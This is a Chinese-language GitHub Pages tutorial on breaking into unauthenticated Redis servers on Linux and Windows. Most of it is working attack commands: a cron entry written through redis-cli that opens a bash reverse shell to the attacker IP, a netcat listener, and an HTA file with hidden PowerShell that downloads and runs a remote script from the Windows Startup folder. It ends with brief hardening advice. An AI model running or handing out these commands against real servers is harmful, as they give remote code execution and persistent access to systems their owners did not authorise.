<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="UTF-8">
    <title>redis 入侵方法(linux/win) by c4bbage</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="stylesheets/normalize.css" media="screen">
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
    <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
  </head>
  <body>
    <section class="page-header">
      <h1 class="project-name">redis 入侵方法(linux/win)</h1>
      <h2 class="project-tagline">redis漏洞 redis未授权访问 redis windows </h2>
    </section>

    <section class="main-content">
      <h2>
<a id="参演演员" class="anchor" href="#%E5%8F%82%E6%BC%94%E6%BC%94%E5%91%98" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>参演演员</h2>

<pre><code>攻击者: 119.97.22.13
漏洞机: 180.33.212.87
</code></pre>

<p>满足以下条件Redis实例存在此安全隐患</p>

<pre><code>Redis使用root用户启动
Redis未设置密码或密码过于简单
Redis未重命名或禁用config, flushdb/flushall,[bg]save等命令
</code></pre>

<p>加强Redis的安全性，提供以下攻击方法和安全规范。</p>

<h2>
<a id="攻击方法" class="anchor" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>攻击方法</h2>

<p><em>重写authorized_keys文件入侵服务器方法略。</em>
<em>利用web路径写webshell方法略。</em></p>

<h3>
<a id="设置key写入反弹shell语句到key保持在redis最顶位" class="anchor" href="#%E8%AE%BE%E7%BD%AEkey%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E8%AF%AD%E5%8F%A5%E5%88%B0key%E4%BF%9D%E6%8C%81%E5%9C%A8redis%E6%9C%80%E9%A1%B6%E4%BD%8D" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>设置key：写入反弹shell语句到key,保持在redis最顶位</h3>

<pre><code>echo -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/119.97.22.13/443 0&gt;&amp;1 \n\n"|redis-cli -h 180.33.212.87 -x set 1
</code></pre>

<h3>
<a id="设置存储目录写入计划任务" class="anchor" href="#%E8%AE%BE%E7%BD%AE%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>设置存储目录:写入计划任务</h3>

<pre><code>redis-cli -h 180.33.212.87 -x config set dir /var/spool/cron
</code></pre>

<h3>
<a id="设置存储文件名" class="anchor" href="#%E8%AE%BE%E7%BD%AE%E5%AD%98%E5%82%A8%E6%96%87%E4%BB%B6%E5%90%8D" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>设置存储文件名:</h3>

<pre><code>redis-cli -h 180.33.212.87 -x config set dbfilename root
</code></pre>

<h3>
<a id="保存到计划任务目录" class="anchor" href="#%E4%BF%9D%E5%AD%98%E5%88%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9B%AE%E5%BD%95" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>保存到计划任务目录:</h3>

<pre><code>redis-cli -h 180.33.212.87 –x save
</code></pre>

<h3>
<a id="获取shell" class="anchor" href="#%E8%8E%B7%E5%8F%96shell" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>获取shell：</h3>

<pre><code>在攻击者主机内用nc监听
nc -l -v -p 443
</code></pre>

<h3>
<a id="windows可以设置启动项" class="anchor" href="#windows%E5%8F%AF%E4%BB%A5%E8%AE%BE%E7%BD%AE%E5%90%AF%E5%8A%A8%E9%A1%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>windows可以设置启动项</h3>

<pre><code>cat hta-psh.txt
&lt;scRipt language="VBscRipT"&gt;CreateObject("WscrIpt.SheLL").Run "powershell -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.97.22.13:8080/1.ps1')"&lt;/scRipt&gt;

cat hta-psh.txt |redis-cli -x -h 180.33.212.87 set a
redis-cli -h 180.33.212.87
config set dir "c:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
config set dbfilename "1.hta"
save
</code></pre>

<h2>
<a id="漏洞修复建议" class="anchor" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>漏洞修复建议：</h2>

<pre><code>1. 恢复Redis 默认配置(dbfilename dir)
    config set dir /etc/redis/
    config set dbfilename dump.rdb
2. 针对新上线Redis建议采用iptables限制、Redis认证限制
    requirepass redispassword
3. 针对新上线Redis建议以低权限用户运行
4. 禁用或重命名危险命令
    rename-command CONFIG CONFIG_b9fc8327c4dee7
    rename-command SHUTDOWN SHUTDOWN_b9fc8327c4dee7
    rename-command FLUSHDB ""
    rename-command FLUSHALL ""
</code></pre>

      <footer class="site-footer">

        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the <a href="https://github.com/jasonlong/cayman-theme">Cayman theme</a> by <a href="https://twitter.com/jasonlong">Jason Long</a>.</span>
      </footer>

    </section>

  
  </body>
</html>
